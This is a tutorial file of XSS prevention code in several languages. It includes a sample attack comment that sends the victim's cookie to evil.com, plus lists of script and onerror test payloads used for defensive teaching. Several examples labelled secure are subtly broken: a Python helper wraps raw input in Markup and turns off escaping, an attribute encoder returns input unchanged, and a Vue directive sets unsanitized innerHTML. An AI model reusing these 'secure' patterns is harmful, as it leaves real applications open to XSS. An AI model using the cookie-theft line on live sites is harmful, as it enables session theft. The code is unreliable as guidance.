# XSS Prevention Code Examples

**Author:** MiniMax Agent  
**Module Reference:** Module 3 - Cross-Site Scripting (XSS)  
**Last Updated:** 2025-11-15  

## Overview
This file contains practical code examples demonstrating XSS prevention techniques across different programming languages and frameworks, covering stored, reflected, and DOM-based XSS vulnerabilities.

---

## 1. Vulnerable Code Examples

### 1.1 Basic Vulnerable HTML Output (PHP)
```php
<?php
// VULNERABLE CODE - NEVER USE IN PRODUCTION
$username = $_GET['username'];
echo "Welcome " . $username . "!";

// Attack Vector: <script>alert('XSS')</script>
// OR: <img src=x onerror="alert('XSS')">
?>
```

### 1.2 Vulnerable JavaScript DOM Manipulation
```javascript
// VULNERABLE CODE
function displayComment(comment) {
    document.getElementById('comment-display').innerHTML = comment;
}

// Attack Vector: <img src=x onerror="document.location='http://evil.com/steal.php?cookie='+document.cookie">
```

### 1.3 Vulnerable Template Rendering (Python)
```python
# VULNERABLE CODE
from flask import Flask, request, render_template_string

@app.route('/user')
def user_profile():
    username = request.args.get('username', '')
    template = '''
    <h1>User Profile</h1>
    <p>Welcome, {{ username }}!</p>
    '''
    return render_template_string(template, username=username)
```

---

## 2. Output Encoding Techniques

### 2.1 HTML Entity Encoding
```php
<?php
class SecureOutput {
    public static function encodeHTML($input) {
        if (is_null($input)) {
            return '';
        }
        
        return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    
    public static function encodeHTMLAttr($input) {
        if (is_null($input)) {
            return '';
        }
        
        return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    
    public static function encodeJavaScript($input) {
        if (is_null($input)) {
            return '';
        }
        
        // For embedding in JavaScript strings
        return json_encode($input, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
    }
    
    public static function encodeURL($input) {
        if (is_null($input)) {
            return '';
        }
        
        return urlencode($input);
    }
}

// Usage examples
$username = $_GET['username'];
echo "<h1>Welcome " . SecureOutput::encodeHTML($username) . "!</h1>";

$user_input = $_POST['comment'];
echo "<p>Comment: " . SecureOutput::encodeHTML($user_input) . "</p>";

$image_alt = $_POST['alt_text'];
echo "<img src='image.jpg' alt='" . SecureOutput::encodeHTMLAttr($image_alt) . "'>";
?>
```

### 2.2 JavaScript Output Encoding
```javascript
class XSSProtector {
    static encodeHTML(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    static encodeAttr(attr) {
        const div = document.createElement('div');
        div.setAttribute('data-temp', attr);
        return div.getAttribute('data-temp');
    }
    
    static encodeJavaScript(str) {
        return JSON.stringify(str, function(key, val) {
            if (typeof val === 'string') {
                return val
                    .replace(/\\u00/g, '\\x')  // Replace unicode escapes
                    .replace(/</g, '\\x3C')    // Replace < to prevent tag breaking
                    .replace(/>/g, '\\x3E');   // Replace > to prevent tag breaking
            }
            return val;
        });
    }
    
    static safeTextNode(text) {
        const textNode = document.createTextNode(text);
        return textNode;
    }
    
    static safeHTML(cleanHTML) {
        const div = document.createElement('div');
        div.innerHTML = cleanHTML;
        // Return the first child if it's a single element, otherwise return text content
        const children = div.childNodes;
        if (children.length === 1 && children[0].nodeType === Node.ELEMENT_NODE) {
            return children[0];
        }
        return div.innerHTML;
    }
}

// Usage examples
const userInput = '<script>alert("XSS")</script>';

// Safe output
const encoded = XSSProtector.encodeHTML(userInput);
element.innerHTML = `<p>${encoded}</p>`;

// Or even safer: use textContent
const textNode = XSSProtector.safeTextNode(userInput);
element.appendChild(textNode);

// For attributes
const attrValue = '<img src=x onerror="alert(1)">';
const safeAttr = XSSProtector.encodeAttr(attrValue);
element.setAttribute('title', safeAttr);
```

### 2.3 Python Output Encoding
```python
from html import escape
from markupsafe import Markup, escape as markup_escape
import json

class SecureTemplate:
    @staticmethod
    def escape_html(text):
        """HTML entity encoding"""
        if text is None:
            return ''
        return escape(str(text), quote=True)
    
    @staticmethod
    def escape_js(text):
        """JavaScript string encoding"""
        if text is None:
            return ''
        
        # Replace potentially dangerous characters
        js_string = str(text)
        js_string = js_string.replace('\\', '\\\\')
        js_string = js_string.replace('"', '\\"')
        js_string = js_string.replace("'", "\\'")
        js_string = js_string.replace('\n', '\\n')
        js_string = js_string.replace('\r', '\\r')
        js_string = js_string.replace('\x00', '\\x00')
        
        return js_string
    
    @staticmethod
    def escape_url(text):
        """URL encoding"""
        if text is None:
            return ''
        import urllib.parse
        return urllib.parse.quote(str(text), safe='')
    
    @staticmethod
    def safe_markup(text):
        """Create safe Markup object for Jinja2"""
        if text is None:
            return Markup('')
        return Markup(text)

# Usage in Flask templates
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/user')
def user_profile():
    username = request.args.get('username', '')
    
    # Use Markup for safe rendering in Jinja2
    safe_username = SecureTemplate.safe_markup(username)
    
    template = '''
    <h1>User Profile</h1>
    <p>Welcome, {{ username }}!</p>
    <p>Bio: {{ bio }}</p>
    <script>
        var username = {{ username_js|tojson }};
        console.log("User: " + username);
    </script>
    '''
    
    return render_template_string(
        template, 
        username=safe_username,
        bio=SecureTemplate.escape_html("User's bio with <script>tags</script>"),
        username_js=username
    )

# For API responses
from flask import jsonify

@app.route('/api/user')
def api_user():
    user_data = {
        'name': '<script>alert(1)</script>',
        'bio': 'Normal bio text'
    }
    
    # Use jsonify which automatically escapes HTML in JSON
    return jsonify(user_data)
```

---

## 3. Content Security Policy (CSP) Implementation

### 3.1 HTTP Header CSP
```php
<?php
class CSPManager {
    private static $policies = [
        'default' => "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https:;",
        'strict' => "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';",
        'relaxed' => "default-src 'self' *.cdn.example.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' *.analytics.com; style-src 'self' 'unsafe-inline' *.cdn.example.com; img-src 'self' data: https:;",
        'api' => "default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none';"
    ];
    
    public static function setCSPHeader($policy = 'default') {
        if (isset(self::$policies[$policy])) {
            header("Content-Security-Policy: " . self::$policies[$policy]);
            
            // Also set for older browsers
            header("X-Content-Security-Policy: " . self::$policies[$policy]);
        }
    }
    
    public static function addNonce($content, $nonce) {
        return str_replace("'unsafe-inline'", "'nonce-{$nonce}'", $content);
    }
    
    public static function generateNonce() {
        return base64_encode(random_bytes(16));
    }
}

// Usage in PHP
CSPManager::setCSPHeader('strict');

// For pages that need inline scripts with nonce
$nonce = CSPManager::generateNonce();
CSPManager::setCSPHeader('strict');
CSPManager::addNonce('script content', $nonce);
?>
```

### 3.2 Meta Tag CSP (Fallback)
```html
<!-- Add to <head> section when HTTP headers can't be set -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline';">

<!-- nonce-based CSP -->
<script nonce="abc123">
    // Inline script will execute because it has matching nonce
    console.log('This script will run');
</script>
```

### 3.3 JavaScript CSP Management
```javascript
class CSPManager {
    static async checkCSPReport(cspHeader) {
        try {
            const reportUri = '/api/csp-report';
            const report = {
                'document-uri': window.location.href,
                'violated-directive': cspHeader,
                'blocked-uri': 'inline'
            };
            
            await fetch(reportUri, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(report)
            });
        } catch (error) {
            console.error('CSP report failed:', error);
        }
    }
    
    static applyMetaCSP(policy) {
        const meta = document.createElement('meta');
        meta.httpEquiv = 'Content-Security-Policy';
        meta.content = policy;
        document.head.appendChild(meta);
    }
    
    static generateNonce() {
        const array = new Uint8Array(16);
        crypto.getRandomValues(array);
        return btoa(String.fromCharCode(...array));
    }
}

// Monitor CSP violations
document.addEventListener('securitypolicyviolation', (event) => {
    console.warn('CSP Violation:', {
        blockedURI: event.blockedURI,
        violatedDirective: event.violatedDirective,
        originalPolicy: event.originalPolicy
    });
    
    // Send to monitoring system
    CSPManager.checkCSPReport(event.originalPolicy);
});
```

---

## 4. DOM-based XSS Prevention

### 4.1 Safe DOM Manipulation
```javascript
// VULNERABLE: Direct innerHTML manipulation
function displayUserComment(comment) {
    document.getElementById('comment-display').innerHTML = comment;
}

// SECURE: Safe DOM creation
function displayUserCommentSecure(comment) {
    const commentDiv = document.getElementById('comment-display');
    
    // Clear existing content
    commentDiv.innerHTML = '';
    
    // Create safe text node
    const textNode = document.createTextNode(comment);
    commentDiv.appendChild(textNode);
}

// SECURE: Controlled HTML rendering
function displayCommentControlled(htmlContent) {
    const allowedTags = ['<p>', '<br>', '<strong>', '<em>', '<u>', '<code>'];
    const allowedAttributes = ['class'];
    
    const parser = new DOMParser();
    const doc = parser.parseFromString(`<div>${htmlContent}</div>`, 'text/html');
    
    // Filter allowed elements
    const walk = (node) => {
        const children = Array.from(node.childNodes);
        for (const child of children) {
            if (child.nodeType === Node.ELEMENT_NODE) {
                const tagName = child.tagName.toLowerCase();
                
                // Remove disallowed tags
                if (!allowedTags.includes(`<${tagName}>`)) {
                    child.replaceWith(...child.childNodes);
                    continue;
                }
                
                // Remove disallowed attributes
                const attrs = Array.from(child.attributes);
                for (const attr of attrs) {
                    if (!allowedAttributes.includes(attr.name)) {
                        child.removeAttribute(attr.name);
                    }
                }
                
                // Recursively process children
                walk(child);
            } else if (child.nodeType === Node.TEXT_NODE) {
                // Text nodes are safe
                continue;
            } else {
                // Remove other node types (comments, etc.)
                child.remove();
            }
        }
    };
    
    walk(doc.body);
    
    return doc.body.firstChild.innerHTML;
}

// Usage
const userComment = '<p>Hello <script>alert(1)</script></p><strong>World!</strong>';
const safeContent = displayCommentControlled(userComment);
document.getElementById('comment').innerHTML = safeContent;
```

### 4.2 URL Handling Security
```javascript
class SafeURLHandler {
    static parseAndValidateURL(urlString) {
        try {
            const url = new URL(urlString);
            
            // Only allow certain protocols
            const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
            if (!allowedProtocols.includes(url.protocol)) {
                throw new Error(`Disallowed protocol: ${url.protocol}`);
            }
            
            // For http/https, validate domain
            if (['http:', 'https:'].includes(url.protocol)) {
                if (!this.isValidDomain(url.hostname)) {
                    throw new Error(`Invalid domain: ${url.hostname}`);
                }
            }
            
            return url;
        } catch (error) {
            throw new Error(`Invalid URL: ${error.message}`);
        }
    }
    
    static isValidDomain(domain) {
        // Basic domain validation
        const domainRegex = /^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$/;
        return domainRegex.test(domain) && domain.length <= 253;
    }
    
    static createSafeLink(urlString, text) {
        try {
            const url = this.parseAndValidateURL(urlString);
            const link = document.createElement('a');
            link.href = url.toString();
            link.textContent = text;
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            return link;
        } catch (error) {
            console.warn('Invalid URL:', error.message);
            const span = document.createElement('span');
            span.textContent = text;
            return span;
        }
    }
    
    static safeRedirect(urlString) {
        try {
            const url = this.parseAndValidateURL(urlString);
            
            // Additional check: only allow same-domain redirects unless explicitly whitelisted
            const allowedDomains = [
                window.location.hostname,
                'trusted-partner.com',
                'api.example.com'
            ];
            
            if (!allowedDomains.includes(url.hostname)) {
                throw new Error(`Redirect to untrusted domain: ${url.hostname}`);
            }
            
            window.location.href = url.toString();
        } catch (error) {
            console.error('Blocked redirect:', error.message);
            // Redirect to safe default or show error
            window.location.href = '/';
        }
    }
}

// Usage examples
const userLink = '<script>window.location="http://evil.com"</script>';
const safeLink = SafeURLHandler.createSafeLink(userLink, 'Click here');
document.body.appendChild(safeLink);
```

---

## 5. Input Sanitization Libraries

### 5.1 DOMPurify Implementation
```html
<!DOCTYPE html>
<html>
<head>
    <title>DOMPurify XSS Protection</title>
    <script src="https://unpkg.com/dompurify@3.0.6/dist/purify.min.js"></script>
</head>
<body>
    <div id="user-content"></div>
    <div id="comment-section"></div>
    
    <script>
        // DOMPurify configuration
        const purifyConfig = {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
            ALLOWED_ATTR: ['href', 'title', 'target', 'rel'],
            FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed'],
            FORBID_ATTR: ['onerror', 'onclick', 'onload', 'style'],
            ALLOW_DATA_ATTR: false,
            RETURN_TRUSTED_TYPE: false
        };
        
        // Safe content rendering
        function renderUserContent(htmlContent) {
            const userContentDiv = document.getElementById('user-content');
            const cleanContent = DOMPurify.sanitize(htmlContent, purifyConfig);
            userContentDiv.innerHTML = cleanContent;
        }
        
        // Comment rendering with additional security
        function renderComment(commentData) {
            const commentDiv = document.getElementById('comment-section');
            
            // Sanitize user input
            const cleanAuthor = DOMPurify.sanitize(commentData.author, {
                ALLOWED_TAGS: [],
                ALLOWED_ATTR: []
            });
            
            const cleanContent = DOMPurify.sanitize(commentData.content, purifyConfig);
            
            // Create safe DOM structure
            commentDiv.innerHTML = '';
            const authorSpan = document.createElement('strong');
            authorSpan.textContent = cleanAuthor + ': ';
            
            const contentDiv = document.createElement('div');
            contentDiv.innerHTML = cleanContent;
            
            commentDiv.appendChild(authorSpan);
            commentDiv.appendChild(contentDiv);
        }
        
        // Example usage
        const maliciousHTML = `
            <p>Hello <strong>world</strong>!</p>
            <script>alert('XSS')</script>
            <img src="x" onerror="alert('XSS')">
            <a href="javascript:alert('XSS')">Click me</a>
        `;
        
        const safeHTML = DOMPurify.sanitize(maliciousHTML, purifyConfig);
        console.log('Original:', maliciousHTML);
        console.log('Sanitized:', safeHTML);
    </script>
</body>
</html>
```

### 5.2 Server-side Sanitization (Node.js)
```javascript
const createDOMPurify = require('isomorphic-dompurify');
const { JSDOM } = require('jsdom');

class SecureSanitizer {
    constructor() {
        // Set up DOMPurify for server-side use
        const window = new JSDOM('').window;
        this.DOMPurify = createDOMPurify(window);
    }
    
    sanitizeHTML(input, options = {}) {
        const defaultOptions = {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'code', 'pre'],
            ALLOWED_ATTR: ['href', 'title', 'target', 'rel', 'class'],
            FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
            FORBID_ATTR: ['onclick', 'onload', 'onerror', 'style'],
            ALLOW_DATA_ATTR: false
        };
        
        const config = { ...defaultOptions, ...options };
        return this.DOMPurify.sanitize(input, config);
    }
    
    sanitizePlainText(input) {
        // Remove all HTML tags and entities
        const window = new JSDOM('').window;
        const DOMPurify = createDOMPurify(window);
        return DOMPurify.sanitize(input, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
    }
    
    extractURLs(text) {
        const urlRegex = /https?:\/\/[^\s]+/g;
        const urls = text.match(urlRegex) || [];
        
        return urls.map(url => {
            try {
                const parsed = new URL(url);
                return {
                    original: url,
                    safe: parsed.href,
                    valid: this.isValidURL(parsed.href)
                };
            } catch {
                return {
                    original: url,
                    safe: null,
                    valid: false
                };
            }
        });
    }
    
    isValidURL(url) {
        try {
            const parsed = new URL(url);
            const allowedProtocols = ['http:', 'https:'];
            return allowedProtocols.includes(parsed.protocol);
        } catch {
            return false;
        }
    }
}

// Express.js middleware for content sanitization
const express = require('express');
const app = express();
const sanitizer = new SecureSanitizer();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Middleware to sanitize user input
const sanitizeInput = (req, res, next) => {
    const sanitizeObject = (obj) => {
        for (const key in obj) {
            if (typeof obj[key] === 'string') {
                obj[key] = sanitizer.sanitizePlainText(obj[key]);
            } else if (typeof obj[key] === 'object' && obj[key] !== null) {
                sanitizeObject(obj[key]);
            }
        }
    };
    
    if (req.body) sanitizeObject(req.body);
    if (req.query) sanitizeObject(req.query);
    
    next();
};

app.post('/api/comment', sanitizeInput, (req, res) => {
    const { content } = req.body;
    
    // Additional HTML sanitization for rich content
    if (content && content.includes('<')) {
        req.body.content = sanitizer.sanitizeHTML(content);
    }
    
    // Process the sanitized comment
    res.json({ success: true, message: 'Comment processed securely' });
});
```

---

## 6. Framework-Specific XSS Prevention

### 6.1 React XSS Prevention
```jsx
import React from 'react';

// VULNERABLE: Using dangerouslySetInnerHTML
function VulnerableComponent({ userContent }) {
    return <div dangerouslySetInnerHTML={{ __html: userContent }} />;
}

// SECURE: Using controlled rendering
function SecureComponent({ userContent }) {
    // Sanitize on the server or use a sanitization library
    const safeContent = sanitizeHTML(userContent);
    
    return <div dangerouslySetInnerHTML={{ __html: safeContent }} />;
}

// SECURE: Using text content only
function SafeTextComponent({ userContent }) {
    return <div>{userContent}</div>; // React automatically escapes this
}

// SECURE: Conditional rendering with validation
function ValidatedContent({ content }) {
    const [sanitized, setSanitized] = React.useState('');
    
    React.useEffect(() => {
        // Client-side sanitization as backup
        const clean = DOMPurify.sanitize(content);
        setSanitized(clean);
    }, [content]);
    
    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Secure form handling
function SecureForm() {
    const [formData, setFormData] = React.useState({
        name: '',
        email: '',
        message: ''
    });
    
    const handleSubmit = (e) => {
        e.preventDefault();
        
        // Validate and sanitize on submit
        const sanitizedData = {
            name: formData.name.trim(),
            email: formData.email.trim(),
            message: formData.message.trim()
        };
        
        // Send sanitized data to server
        fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(sanitizedData)
        });
    };
    
    return (
        <form onSubmit={handleSubmit}>
            <input
                type="text"
                value={formData.name}
                onChange={(e) => setFormData({...formData, name: e.target.value})}
                placeholder="Name"
                required
            />
            <input
                type="email"
                value={formData.email}
                onChange={(e) => setFormData({...formData, email: e.target.value})}
                placeholder="Email"
                required
            />
            <textarea
                value={formData.message}
                onChange={(e) => setFormData({...formData, message: e.target.value})}
                placeholder="Message"
                required
            />
            <button type="submit">Submit</button>
        </form>
    );
}
```

### 6.2 Vue.js XSS Prevention
```vue
<template>
  <!-- VULNERABLE: Using v-html with untrusted data -->
  <div v-html="userContent"></div>
  
  <!-- SECURE: Using text content -->
  <div>{{ userContent }}</div>
  
  <!-- SECURE: Conditional sanitized content -->
  <div v-if="sanitizedContent" v-html="sanitizedContent"></div>
</template>

<script>
export default {
  name: 'SecureComponent',
  data() {
    return {
      userContent: '<script>alert("XSS")</script>Normal content',
      sanitizedContent: ''
    };
  },
  
  mounted() {
    this.sanitizeContent();
  },
  
  methods: {
    sanitizeContent() {
      // Use DOMPurify for Vue.js
      this.sanitizedContent = this.$DOMPurify.sanitize(this.userContent);
    },
    
    handleUserInput(input) {
      // Validate and sanitize user input
      const clean = this.$DOMPurify.sanitize(input, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
        ALLOWED_ATTR: []
      });
      
      this.userInput = clean;
    }
  },
  
  // Custom directive for safe HTML rendering
  directives: {
    safeHtml: {
      bind(el, binding) {
        el.innerHTML = binding.value;
      },
      update(el, binding) {
        // Re-sanitize when value changes
        const clean = this.$DOMPurify.sanitize(binding.value);
        el.innerHTML = clean;
      }
    }
  }
};
</script>

<style scoped>
/* Additional CSS protection */
.content-container {
  /* Prevent CSS injection */
  font-family: system-ui, sans-serif;
}

.content-container a {
  /* Ensure links are safe */
  color: #0066cc;
  text-decoration: none;
}

.content-container a:hover {
  text-decoration: underline;
}
</style>
```

---

## 7. Cookie and Session Security

### 7.1 Secure Cookie Configuration
```php
<?php
class SecureCookieManager {
    public static function setSecureCookie($name, $value, $expiry = null, $path = '/', $domain = null, $secure = true, $httponly = true, $samesite = 'Strict') {
        if ($expiry === null) {
            $expiry = time() + (86400 * 30); // 30 days
        }
        
        // Set cookie with security flags
        setcookie($name, $value, [
            'expires' => $expiry,
            'path' => $path,
            'domain' => $domain,
            'secure' => $secure,
            'httponly' => $httponly,
            'samesite' => $samesite
        ]);
    }
    
    public static function setSessionCookie() {
        // Secure session cookie settings
        ini_set('session.cookie_httponly', 1);
        ini_set('session.cookie_secure', 1); // Requires HTTPS
        ini_set('session.cookie_samesite', 'Strict');
        ini_set('session.use_only_cookies', 1);
        ini_set('session.use_strict_mode', 1);
        
        // Generate secure session ID
        ini_set('session.entropy_length', 32);
        ini_set('session.entropy_file', '/dev/urandom');
    }
    
    public static function clearCookie($name, $path = '/', $domain = null) {
        // Clear cookie by setting expiry in the past
        setcookie($name, '', time() - 3600, $path, $domain);
    }
}

// Usage
SecureCookieManager::setSessionCookie();

// Set authentication cookie
SecureCookieManager::setSecureCookie(
    'auth_token',
    $secureToken,
    time() + (86400 * 7), // 7 days
    '/',
    null, // Domain
    true, // Secure (HTTPS only)
    true, // HttpOnly
    'Strict' // SameSite
);
?>
```

### 7.2 JavaScript Cookie Security
```javascript
class SecureCookieManager {
    static setCookie(name, value, days = 30) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
        
        document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }
    
    static getCookie(name) {
        const nameEQ = name + "=";
        const cookies = document.cookie.split(';');
        
        for (let cookie of cookies) {
            cookie = cookie.trim();
            if (cookie.indexOf(nameEQ) === 0) {
                return cookie.substring(nameEQ.length);
            }
        }
        return null;
    }
    
    static deleteCookie(name) {
        document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/;SameSite=Strict`;
    }
    
    // Check if cookie can be set (no XSS vulnerability)
    static validateCookieSetting() {
        // Check if we're in a secure context (HTTPS)
        if (location.protocol !== 'https:') {
            console.warn('Secure cookies require HTTPS');
            return false;
        }
        
        // Check if HttpOnly cookies are supported
        // Note: JavaScript cannot read HttpOnly cookies anyway
        return true;
    }
}

// Usage with proper validation
if (SecureCookieManager.validateCookieSetting()) {
    SecureCookieManager.setCookie('user_preference', 'dark_mode', 30);
}
```

---

## 8. Testing and Validation

### 8.1 XSS Test Suite
```javascript
class XSSTester {
    constructor() {
        this.testPayloads = [
            {
                name: 'Basic Script Tag',
                payload: '<script>alert("XSS")</script>',
                type: 'stored'
            },
            {
                name: 'Image onError',
                payload: '<img src="x" onerror="alert(\'XSS\')">',
                type: 'stored'
            },
            {
                name: 'JavaScript Protocol',
                payload: '<a href="javascript:alert(\'XSS\')">Click</a>',
                type: 'reflected'
            },
            {
                name: 'Inline Event Handler',
                payload: '<div onmouseover="alert(\'XSS\')">Hover</div>',
                type: 'stored'
            },
            {
                name: 'SVG Script',
                payload: '<svg onload="alert(\'XSS\')">',
                type: 'stored'
            },
            {
                name: 'BASE64 Encoded',
                payload: '',
                type: 'reflected'
            }
        ];
    }
    
    testInputValidation(input, validationFunction) {
        return this.testPayloads.map(payload => {
            try {
                const result = validationFunction(payload.payload);
                return {
                    payload: payload.name,
                    allowed: result,
                    vulnerable: result === payload.payload
                };
            } catch (error) {
                return {
                    payload: payload.name,
                    allowed: false,
                    error: error.message
                };
            }
        });
    }
    
    generateTestReport(results) {
        let report = 'XSS Protection Test Results\n';
        report += '=============================\n\n';
        
        const vulnerable = results.filter(r => r.vulnerable).length;
        const blocked = results.filter(r => !r.vulnerable && !r.error).length;
        const errors = results.filter(r => r.error).length;
        
        report += `Total Tests: ${results.length}\n`;
        report += `Vulnerable: ${vulnerable}\n`;
        report += `Blocked: ${blocked}\n`;
        report += `Errors: ${errors}\n`;
        report += `Security Score: ${Math.round((blocked / results.length) * 100)}%\n\n`;
        
        results.forEach(result => {
            const status = result.vulnerable ? 'VULNERABLE' : 
                          result.error ? 'ERROR' : 'BLOCKED';
            report += `[${status}] ${result.payload}\n`;
            if (result.error) {
                report += `  Error: ${result.error}\n`;
            }
            report += '\n';
        });
        
        return report;
    }
}

// Example validation function to test
function basicValidation(input) {
    // This is a basic validation - it should fail the tests
    return input.replace(/<script>/gi, ''); // Only removes <script> tags
}

// Run tests
const tester = new XSSTester();
const results = tester.testInputValidation('', basicValidation);
console.log(tester.generateTestReport(results));
```

### 8.2 Browser-based XSS Detection
```javascript
class XSSDetector {
    constructor() {
        this.violations = [];
        this.setupCSPMonitoring();
        this.setupDOMMonitoring();
    }
    
    setupCSPMonitoring() {
        // Monitor CSP violations
        document.addEventListener('securitypolicyviolation', (event) => {
            this.recordViolation({
                type: 'csp',
                blockedURI: event.blockedURI,
                violatedDirective: event.violatedDirective,
                documentURI: event.documentURI,
                timestamp: new Date().toISOString()
            });
        });
    }
    
    setupDOMMonitoring() {
        // Monitor for script injection
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        this.checkElementForXSS(node);
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    checkElementForXSS(element) {
        // Check for dangerous attributes
        const dangerousAttributes = ['onclick', 'onload', 'onerror', 'onmouseover'];
        dangerousAttributes.forEach(attr => {
            if (element.hasAttribute(attr)) {
                this.recordViolation({
                    type: 'dom',
                    element: element.tagName.toLowerCase(),
                    attribute: attr,
                    value: element.getAttribute(attr),
                    timestamp: new Date().toISOString()
                });
            }
        });
        
        // Check for script tags
        if (element.tagName.toLowerCase() === 'script') {
            this.recordViolation({
                type: 'dom',
                element: 'script',
                timestamp: new Date().toISOString()
            });
        }
        
        // Check for dangerous elements
        const dangerousTags = ['iframe', 'object', 'embed', 'applet'];
        if (dangerousTags.includes(element.tagName.toLowerCase())) {
            this.recordViolation({
                type: 'dom',
                element: element.tagName.toLowerCase(),
                timestamp: new Date().toISOString()
            });
        }
    }
    
    recordViolation(violation) {
        this.violations.push(violation);
        
        // Send to monitoring system
        this.sendViolationReport(violation);
        
        // Log for development
        console.warn('XSS Attempt Detected:', violation);
    }
    
    async sendViolationReport(violation) {
        try {
            await fetch('/api/xss-violation', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(violation)
            });
        } catch (error) {
            console.error('Failed to send violation report:', error);
        }
    }
    
    getReport() {
        return {
            totalViolations: this.violations.length,
            violations: this.violations,
            summary: this.generateSummary()
        };
    }
    
    generateSummary() {
        const types = {};
        this.violations.forEach(v => {
            types[v.type] = (types[v.type] || 0) + 1;
        });
        
        return {
            violationTypes: types,
            mostRecent: this.violations[this.violations.length - 1],
            firstViolation: this.violations[0]
        };
    }
}

// Initialize detector
const xssDetector = new XSSDetector();
```

---

## 9. Best Practices and Guidelines

### 9.1 XSS Prevention Checklist
```javascript
const XSSPreventionChecklist = {
    // Input Validation
    'Input Validation': {
        'Validate all user input': false,
        'Use whitelist validation': false,
        'Sanitize file uploads': false,
        'Validate URLs and redirects': false
    },
    
    // Output Encoding
    'Output Encoding': {
        'Encode HTML output': false,
        'Encode JavaScript strings': false,
        'Encode URLs': false,
        'Use context-aware encoding': false
    },
    
    // Content Security Policy
    'CSP Implementation': {
        'Implement CSP headers': false,
        'Use nonces for inline scripts': false,
        'Restrict external resources': false,
        'Monitor CSP violations': false
    },
    
    // Framework Security
    'Framework Security': {
        'Use framework auto-escaping': false,
        'Disable dangerous features': false,
        'Implement secure routing': false,
        'Use security headers': false
    },
    
    // Session Security
    'Session Security': {
        'Use HttpOnly cookies': false,
        'Implement secure cookie flags': false,
        'Protect against CSRF': false,
        'Secure session management': false
    },
    
    // Testing
    'Security Testing': {
        'Automated XSS testing': false,
        'Manual penetration testing': false,
        'Code review for XSS': false,
        'Security monitoring': false
    }
};

function evaluateXSSSecurity() {
    const results = {};
    let totalChecks = 0;
    let passedChecks = 0;
    
    for (const [category, checks] of Object.entries(XSSPreventionChecklist)) {
        results[category] = {};
        const categoryChecks = Object.keys(checks).length;
        let categoryPassed = 0;
        
        for (const [check, required] of Object.entries(checks)) {
            totalChecks++;
            if (required) {
                passedChecks++;
                categoryPassed++;
            }
            results[category][check] = required ? '✓ PASS' : '✗ FAIL';
        }
        
        results[category].categoryScore = `${categoryPassed}/${categoryChecks}`;
    }
    
    results.overallScore = `${passedChecks}/${totalChecks} (${Math.round((passedChecks / totalChecks) * 100)}%)`;
    
    return results;
}
```

---

## Conclusion

XSS prevention requires a multi-layered approach:

1. **Always encode output** - Use context-aware encoding for all user data
2. **Implement CSP** - Add an additional security layer with Content Security Policy
3. **Validate input** - Whitelist validation prevents malicious data from entering the system
4. **Use security libraries** - DOMPurify and similar libraries provide proven protection
5. **Framework security** - Leverage built-in security features of modern frameworks
6. **Test thoroughly** - Include XSS testing in your security testing regimen
7. **Monitor continuously** - Detect and respond to XSS attempts in real-time
8. **Stay updated** - Keep security libraries and frameworks current

**Remember:** No single technique provides complete protection. Use defense-in-depth with multiple overlapping security controls for the most effective XSS prevention.